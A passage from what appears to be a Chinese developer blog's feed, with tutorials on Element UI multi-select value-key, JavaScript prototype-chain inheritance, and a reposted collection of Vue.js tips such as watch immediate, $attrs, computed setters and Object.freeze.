      <url>/2019/11/feec6e96dc41.html</url>
      
        <content type="html"><![CDATA[<p>当我们使用 Elemet UI 的选择组件进行多选时，Select 组件的绑定值是一个数组，但是数组的值只能传入 Number 类型或者 String 类型的数据，如果我们想向其中传入一个对象就会出错，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-select</span> <span class="attr">v-model</span>=<span class="string">&quot;permissionList&quot;</span> <span class="attr">multiple</span> <span class="attr">placeholder</span>=<span class="string">&quot;请选择&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-option</span> <span class="attr">v-for</span>=<span class="string">&quot;item in groups&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.groupID&quot;</span> <span class="attr">:label</span>=<span class="string">&quot;item.name&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;item&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">permissionList</span>: [],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">groups</span>: [&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">id</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;A组&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">permission</span>: <span class="string">&#x27;Write&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">id</span>: <span class="number">2</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;B组&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">permission</span>: <span class="string">&#x27;Write&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">id</span>: <span class="number">3</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">name</span>: <span class="string">&#x27;C组&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">permission</span>: <span class="string">&#x27;Write&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这样组件在选择的时候就会出错：</p><p><img src="https://img-blog.csdnimg.cn/2019110712074016.png" alt="在这里插入图片描述"></p><p>同时，控制台报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue.runtime.esm.js:619 [Vue warn]: &lt;transition-group&gt; children must be keyed: &lt;ElTag&gt;</span><br></pre></td></tr></table></figure><p>我们可以发现其为缺少一个索引，翻查 elemnet-ui 的文档，可以查阅到 Select 组件有一个属性：</p><p><img src="https://img-blog.csdnimg.cn/20191107121013628.png" alt="在这里插入图片描述"><br>那么，我们可以为其添加一个索引的属性，这个 value-key 即为我们绑定对象的唯一标识符，如在上述的例子中，这个标识符为 <code>groupID</code></p><p>所以可以将上面的代码改动为：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;el-select </span><br><span class="line">v-model=&quot;permissionList&quot; </span><br><span class="line">multiple </span><br><span class="line">placeholder=&quot;请选择&quot;</span><br><span class="line"><span class="addition">+value-key=&quot;groupID&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">&lt;el-option v-for=&quot;item in groups&quot; :key=&quot;item.groupID&quot; :label=&quot;item.name&quot; :value=&quot;item&quot; /&gt;</span><br><span class="line">&lt;/el-select&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElementUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一段代码两张图，帮你理解JS中的原型链继承</title>
      <link href="/2019/10/0d98e8cdaa18.html"/>
      <url>/2019/10/0d98e8cdaa18.html</url>
      
        <content type="html"><![CDATA[<p>创建一个 Animal 类，Dog 类继承与 Animal 类，同时实例化一个 Dog 类为 dog，查看其显式原型与隐式原型之间的关系：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;吃东西&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">brak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wang!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;huahua&quot;</span>)</span><br><span class="line">dog.<span class="title function_">eat</span>() <span class="comment">// 吃东西</span></span><br><span class="line">dog.<span class="title function_">brak</span>() <span class="comment">// wang!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">__proto__</span>); <span class="comment">// Dog &#123;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>); <span class="comment">// [Function: Dog]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// Dog &#123;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>); <span class="comment">// Animal &#123;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property">__proto__</span>); <span class="comment">// [Function: Animal]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property">__proto__</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// Animal &#123;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>); <span class="comment">// [Function]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>); <span class="comment">// &#123;&#125;</span></span><br></pre></td></tr></table></figure><p>将以上的显式原型（prototype）与隐式原型（__proto__）转换为如下的可视关系：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20191109222853.png" alt=""></p><p>网上流行的一张图：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20191224133325.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue使用中的各种小技巧（转载）</title>
      <link href="/2019/10/ae9fc6bcd20d.html"/>
      <url>/2019/10/ae9fc6bcd20d.html</url>
      
        <content type="html"><![CDATA[<h3 id="Watch-immediate"><a href="#Watch-immediate" class="headerlink" title="Watch immediate"></a>Watch immediate</h3><p>这个已经算是一个比较常见的技巧了，这里就简单说一下。当 watch 一个变量的时候，初始化时并不会执行，如下面的例子，你需要在<code>created</code>的时候手动调用一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// bad</span><br><span class="line">created() &#123;</span><br><span class="line">  this.fetchUserList();</span><br><span class="line">&#125;,</span><br><span class="line">watch: &#123;</span><br><span class="line">  searchText: &#x27;fetchUserList&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>你可以添加<code>immediate</code>属性，这样初始化的时候也会触发，然后上面的代码就能简化为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// good</span><br><span class="line">watch: &#123;</span><br><span class="line">  searchText: &#123;</span><br><span class="line">    handler: &#x27;fetchUserList&#x27;,</span><br><span class="line">    immediate: true,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>ps: watch 还有一个容易被大家忽略的属性<code>deep</code>。当设置为<code>true</code>时，它会进行深度监听。简而言之就是你有一个 <code>const obj=&#123;a:1,b:2&#125;</code>，里面任意一个 key 的 value 发生变化的时候都会触发<code>watch</code>。应用场景：比如我有一个列表，它有一堆<code>query</code>筛选项，这时候你就能<code>deep watch</code>它，只有任何一个筛序项改变的时候，就自动请求新的数据。或者你可以<code>deep watch</code>一个 form 表单，当任何一个字段内容发生变化的时候，你就帮它做自动保存等等。</p><h3 id="Attrs-和-Listeners"><a href="#Attrs-和-Listeners" class="headerlink" title="Attrs 和 Listeners"></a>Attrs 和 Listeners</h3><p>这两个属性是 <code>vue 2.4</code> 版本之后提供的，它简直是二次封装组件或者说写高阶组件的神器。在我们平时写业务的时候免不了需要对一些第三方组件进行二次封装。比如我们需要基于<code>el-select</code>分装一个带有业务特性的组件，根据输入的 name 搜索用户，并将一些业务逻辑分装在其中。但<code>el-select</code>这个第三方组件支持几十个配置参数，我们当然可以适当的挑选几个参数通过 props 来传递，但万一哪天别人用你的业务组件的时候觉得你的参数少了，那你只能改你封装的组件了，亦或是哪天第三方组件加入了新参数，你该怎么办？</p><p>其实我们的这个组件只是基于<code>el-select</code>做了一些业务的封装，比如添加了默认的<code>placeholder</code>，封装了远程 ajax 搜索请求等等，总的来说它就是一个中间人组件，只负责传递数据而已。</p><p>这时候我们就可以使用<code>v-bind=&quot;$attrs&quot;</code>：传递所有属性、<code>v-on=&quot;$listeners&quot;</code>传递所有方法。如下图所示：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS80LzI0LzE2YTRlODJiMjhmMmIyNGM?x-oss-process=image/format,png" alt=""></p><p>这样，我们没有在<code>$props</code>中声明的方法和属性，会通过<code>$attrs</code>、<code>$listeners</code>直接传递下去。这两个属性在我们平时分装第三方组件的时候非常有用！</p><h3 id="sync"><a href="#sync" class="headerlink" title=".sync"></a>.sync</h3><p>这个也是 <code>vue 2.3</code> 之后新加的一个语法糖。这也是平时在分装组件的时候很好用的一个语法糖，它的实现机制和<code>v-model</code>是一样的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS81LzEwLzE2YWEwNmJhZDM3OWVmZmY?x-oss-process=image/format,png" alt=""></p><p>当你有需要在子组件修改父组件值的时候这个方法很好用。 线上 <a href="https://github.com/PanJiaChen/vue-element-admin/blob/master/src/components/Pagination/index.vue">例子</a></p><h3 id="Computed-的-get-和-set"><a href="#Computed-的-get-和-set" class="headerlink" title="Computed 的 get 和 set"></a>Computed 的 get 和 set</h3><p><code>computed</code> 大家肯定都用过，它除了可以缓存计算属性外，它在处理传入数据和目标数据格式不一致的时候也是很有用的。set、get <a href="https://cn.vuejs.org/v2/guide/computed.html#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E7%9A%84-setter">文档</a></p><p>上面说的可能还是是有点抽象，举一个简单的的例子：我们有一个 form 表单，from 里面有一个记录创建时间的字段<code>create_at</code>。我们知道前端的时间戳都是 13 位的，但很多后端默认时间戳是 10 位的，这就很蛋疼了。前端和后端的时间戳位数不一致。最常见的做法如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS81LzcvMTZhOTEzODc3NjJjMjZkMg?x-oss-process=image/format,png" alt=""></p><p>上面的代码主要做的是：在拿到数据的时候将后端 10 位时间戳转化为 13 位时间戳，之后再向服务端发送数据的时候再转化回 10 位时间戳传给后端。目前这种做法当然是可行的，但之后可能不仅只有创建接口，还有更新接口的时候，你还需要在<code>update</code>的接口里在做一遍同样数据转化的操作么？而且这只是一个最简单的例子，真实的 form 表单会复杂的多，需要处理的数据也更为的多。这时候代码就会变得很难维护。</p><p>这时候就可以使用 computed 的 set 和 get 方法了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS81LzkvMTZhOWI2MjllOTgyNzExNQ?x-oss-process=image/format,png" alt=""></p><p>通过上面的代码可以看到，我们把需要做前后端兼容的数据，放在了 computed 中，从 <code>getData</code>和<code>submit</code>中隔离了数据处理的部分。</p><p>当然上面说的方案还不是最好的方案，你其实应该利用之前所说的<code>v-bind=&quot;$attrs&quot;</code>和<code>v-on=&quot;$listeners&quot;</code>对时间选择器组件进行二次封装。例如这样<code>&lt;date-time v-model=&quot;postForm.create_at&quot; /&gt;</code> 外部无需做任何数据处理，直接传入一个 10 位的时间戳，内部进行转化。当日期发生变化的时候，自动通过<code>emit</code>触发<code>input</code>使<code>v-model</code>发生变化，把所有脏活累活都放在组件内部完成，保持外部业务代码的相对干净。具体 v-model 语法糖原理可以见官方 <a href="https://cn.vuejs.org/v2/guide/components.html#%E5%9C%A8%E7%BB%84%E4%BB%B6%E4%B8%8A%E4%BD%BF%E7%94%A8-v-model">文档</a>。</p><p>set 和 get 处理可以做上面说的进行一些数据处理之外，你也可以把它当做一个 <code>watch</code>的升级版。它可以监听数据的变化，当发生变化时，做一些额外的操作。最经典的用法就是<code>v-model</code>上绑定一个 vuex 值的时候，input 发生变化时，通过 <code>commit</code>更新存在 vuex 里面的值。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS81LzcvMTZhOTE2ZjA4ZDk1MWY0NQ?x-oss-process=image/format,png" alt=""></p><p>具体的解释你也可以见官方 <a href="https://vuex.vuejs.org/zh/guide/forms.html">文档</a></p><h3 id="Object-freeze"><a href="#Object-freeze" class="headerlink" title="Object.freeze"></a>Object.freeze</h3><p>这算是一个性能优化的小技巧吧。在我们遇到一些 <code>big data</code>的业务场景，它就很有用了。尤其是做管理后台的时候，经常会有一些超大数据量的 table，或者一个含有 n 多数据的图表，这种数据量很大的东西使用起来最明显的感受就是卡。但其实很多时候其实这些数据其实并不需要响应式变化，这时候你就可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze">Object.freeze</a> 方法了，它可以冻结一个对象(注意它不并是 vue 特有的 api)。</p><p>当你把一个普通的 JavaScript 对象传给 Vue 实例的 data 选项，Vue 将遍历此对象所有的属性，并使用 <code>Object.defineProperty</code> 把这些属性全部转为 <code>getter/setter</code>，它们让 Vue 能进行追踪依赖，在属性被访问和修改时通知变化。 使用了 <code>Object.freeze</code> 之后，不仅可以减少 <code>observer</code> 的开销，还能减少不少内存开销。相关 <a href="https://github.com/vuejs/vue/issues/4384">issue</a>。</p><p>使用方式：<code>this.item = Object.freeze(Object.assign(&#123;&#125;, this.item))</code></p><p>这里我提供了一个在线测速 demo，<a href="https://panjiachen.gitee.io/panjiachen.github.io/big-table/index.html">点我</a>。</p><p>通过测速可以发现正常情况下<code>1000 x 10</code> rerender 都稳定在 1000ms-2000ms 之间，而开启了<code>Object.freeze</code>的情况下，rerender 都稳住在 100ms-200ms 之间。有接近 10 倍的差距。所以能确定不需要变化检测的情况下，<code>big data</code> 还是要优化一下的。</p><h3 id="Functional"><a href="#Functional" class="headerlink" title="Functional"></a>Functional</h3><p><a href="https://cn.vuejs.org/v2/guide/render-function.html#%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BB%84%E4%BB%B6">函数式组件</a> 这个是文档里就写的内容，但在其实很少人会刻意的去使用。因为你不用它，代码也不会有任何问题，用了到可能会出现 bug。</p><p>我们先看一个例子：<a href="https://vue-9-perf-secrets.netlify.com/bench/functional">点我测试性能</a> 肉眼可见的性能差距。当然很多人会觉得我的项目中也没有这种变化量级，但我觉得这是一个程序员的自我修养问题吧。，比如能用<code>v-show</code>的地方就不要用<code>v-if</code>，善用<code>keep-alive</code>和<code>v-once</code>，<code>Object.freeze()</code>处理 <a href="https://github.com/vuejs/vue/issues/4384">vue big data</a> 问题等。虽然都是一些小细节，但对性能和体验都是有不少的提升的。更多的性能优化技巧请查看该文章 <a href="https://slides.com/akryum/vueconfus-2019#/">vue-9-perf-secrets</a></p><h3 id="减少全局操作"><a href="#减少全局操作" class="headerlink" title="减少全局操作"></a>减少全局操作</h3><p>这其实并不只是针对 vue 项目的一个建议，我们平时写代码的时候一定要尽量避免一些全局的操作。如果必须要用到的时候，一定要自己检查，会不会产生一些全局的污染或者副作用。</p><p>举几个简单例子：</p><ol><li><p>我们现在虽然用 vue 写代码了，核心思想转变为用数据驱动 <code>view</code>，不用像<code>jQuery</code>时代那样，频繁的操作 DOM 节点。但还是免不了有些场景还是要操作 DOM 的。我们在组件内选择节点的时候一定要切记避免使用 <code>document.querySelector()</code>等一系列的全局选择器。你应该使用<code>this.$el</code>或者<code>this.refs.xxx.$el</code>的方式来选择 DOM。这样就能将你的操作局限在当前的组件内，能避免很多问题。</p></li><li><p>我们经常会不可避免的需要注册一些全局性的事件，比如监听页面窗口的变化<code>window.addEventListener(&#39;resize&#39;, this.__resizeHandler)</code>，但再声明了之后一定要在 <code>beforeDestroy</code>或者<code>destroyed</code>生命周期注销它。<code>window.removeEventListener(&#39;resize&#39;, this.__resizeHandler)</code>避免造成不必要的消耗。</p></li><li><p>避免过多的全局状态，不是所有的状态都需要存在 vuex 中的，应该根据业务进行合理的进行取舍。如果不可避免有很多的值需要存在 vuex 中，建议使用动态注册的方式。相关<a href="https://vuex.vuejs.org/zh/guide/modules.html#%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C">文档</a>。只是部分业务需要的状态处理，建议使用 <code>Event Bus</code>或者使用 <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8">简单的 store 模式</a>。</p></li><li><p>css 也应该尽量避免写太多的全局性的样式。除了一些全局公用的样式外，所以针对业务的或者组件的样式都应该使用命名空间的方式或者直接使用 vue-loader 提供的 <code>scoped</code>写法，避免一些全局冲突。<a href="https://panjiachen.gitee.io/vue-element-admin-site/zh/guide/essentials/style.html#css-modules">文档</a></p></li></ol><h3 id="Sass-和-Js-之间变量共享"><a href="#Sass-和-Js-之间变量共享" class="headerlink" title="Sass 和 Js 之间变量共享"></a>Sass 和 Js 之间变量共享</h3><p>这个需求可能有些人没有遇到过，举个实际例子来说明一下。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlOTlmNmJjMjM0M2M?x-oss-process=image/format,png" alt=""></p><p>如上面要实现一个动态的换肤，就需要将用户选择的 theme 主题色传递给 css。但同时初始化的时候 css 又需要将一个默认主题色传递给 js。所以下面我们就分两块来讲解。</p><ul><li><p>js 将变量传递给 sass 这部分是相对简单就可以实现的，实现方案也很多。最简单的方法就是通过 在模板里面写 style 标签来实现，就是俗话所说的内联标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div :style=&quot;&#123;&#x27;background-color&#x27;:color&#125;&quot; &gt;&lt;/div&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>或者使用 <code>css var()</code>，在线 <a href="https://codepen.io/richardtallent/pen/yvpERW/">demo</a>，还有用 less 的话<code>modifyVars</code>，等等方案都能实现 js 与 css 的变量传递。</p></li><li><p>sass 将变量给 js</p></li></ul><p>还是那前面那个换肤来举例子，我们页面初始化的时候，总需要一个默认主题色吧，假设我们在 <code>var.scss</code>中声明了一个 <code>theme:blue</code>，我们在 js 中该怎么获取这个变量呢？我们可以通过 <a href="https://github.com/css-modules/icss#export">css-modules</a> <code>:export</code>来实现。更具体的解释- <a href="https://www.bluematador.com/blog/how-to-share-variables-between-js-and-sass">How to Share Variables Between Javascript and Sass</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// var.scss</span><br><span class="line">$theme: blue;</span><br><span class="line"></span><br><span class="line">:export &#123;</span><br><span class="line">  theme: $theme;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// test.js</span><br><span class="line">import variables from &#x27;@/styles/var.scss&#x27;</span><br><span class="line">console.log(variables.theme) // blue</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当 js 和 css 共享一个变量的时候这个方案还是很实用的。vue-element-admin 中的侧边栏的宽度，颜色等等变量都是通过这种方案来实现共享的。</p><p>其它换肤方案可以参考 <a href="https://juejin.im/post/5ca41617f265da3092006155">聊一聊前端换肤</a>。</p><h3 id="自动注册全局组件"><a href="#自动注册全局组件" class="headerlink" title="自动注册全局组件"></a>自动注册全局组件</h3><p>我的业务场景大部分是中后台，虽然封装和使用了很多第三方组件，但还是免不了需要自己封装和使用很多业务组件。但每次用的时候还需要手动引入，真的是有些麻烦的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlNDBkNWFjMDU2OTk?x-oss-process=image/format,png" alt=""></p><p>我们其实可以基于 webpack 的<code>require.context</code>来实现自动加载组件并注册的全局的功能。相关原理在之前的文章中已经阐述过了。具体代码如下</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlNDU3NWRjMjQzZDk?x-oss-process=image/format,png" alt=""></p><p>我们可以创建一个<code>GlobalComponents</code>文件夹，将你想要注册到全局的组件都放在这个文件夹里，在<code>index.js</code>里面放上如上代码。之后只要在入口文件<code>main.js</code>中引入即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//main.js</span><br><span class="line">import &#x27;./components/Table/index&#x27; // 自动注册全局业务组件</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这样我们可以在模板中直接使用这些全局组建了。不需要再繁琐的手动引入了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;user-select/&gt;</span><br><span class="line">    &lt;status-button/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当然你也不要为了省事，啥组件都往全局注册，这样会让你初始化页面的时候你的初始<code>init bundle</code>很大。你应该就注册那些你经常使用且体积不大的组件。那些体积大的组件，如编辑器或者图表组件还是按需加载比较合理。而且你最好声明这些全局组件的时候有一个统一的命名规范比如：<code>globel-user-select</code>这样的，指定一个团队规范，不然人家看到你这个全局组件会一脸懵逼，这个组件是哪来的。</p><h3 id="Lint"><a href="#Lint" class="headerlink" title="Lint"></a>Lint</h3><p>这又是一个老生常谈的问题了 vue 的一些最佳实践什么的话，这里不讨论了，我觉得看官方的 <a href="https://cn.vuejs.org/v2/style-guide/">风格指南</a> 差不多就够了。比如避免<code>避免 v-if 和 v-for 用在一起</code>、<code>元素特性的顺序</code>这些等等规则，几十条规则，说真的写了这么久 vue，我也只能记住一些常规的。什么属性的顺序啊，不太可能记住的。这种东西还是交给程序来自动优化才是更合理的选择。强烈推荐配置编辑器自动化处理。具体配置见 <a href="https://panjiachen.gitee.io/vue-element-admin-site/zh/guide/advanced/eslint.html">文档</a>。同时建议结合 <code>Git Hooks</code> 配合在每次提交代码时对代码进行 lint 校验，确保所有提交到远程仓库的代码都符合团队的规范。它主要使用到的工具是<code>husky</code>和<code>lint-staged</code>，详细文档见 <a href="https://panjiachen.gitee.io/vue-element-admin-site/zh/guide/advanced/git-hook.html#git-hooks">Git Hooks</a></p><h3 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h3><p>这个是一个文档里没有写的 api，但我觉得是一个很有用的 api。比如我们平时使用一些第三方组件，或者注册一些全局事件的时候，都需要在<code>mounted</code>中声明，在<code>destroyed</code>中销毁。但由于这个是写在两个生命周期内的，很容易忘记，而且大部分在创建阶段声明的内容都会有副作用，如果你在组件摧毁阶段忘记移除的话，会造成内存的泄漏，而且都不太容易发现。如下代码：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlMmNlNDA4YTUzYmQ?x-oss-process=image/format,png" alt=""></p><p>react 在新版本中也加入了<code>useEffect</code>，将以前的多个 life-cycles 合并、重组，使逻辑更加清晰，这里就不展开了。那 vue 是不是也可以这样做？我去了看了一下官方的 <code>vue-hooks</code>的 <a href="https://github.com/yyx990803/vue-hooks/blob/master/index.js">源码</a> 发现了一个新的 api：<code>$on(&#39;hook:xxx&#39;)</code>。有了它，我们就能将之前的代码用更简单和清楚地方式实现了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8zLzI3LzE2OWJlMmNlNDFmY2MyMzI?x-oss-process=image/format,png" 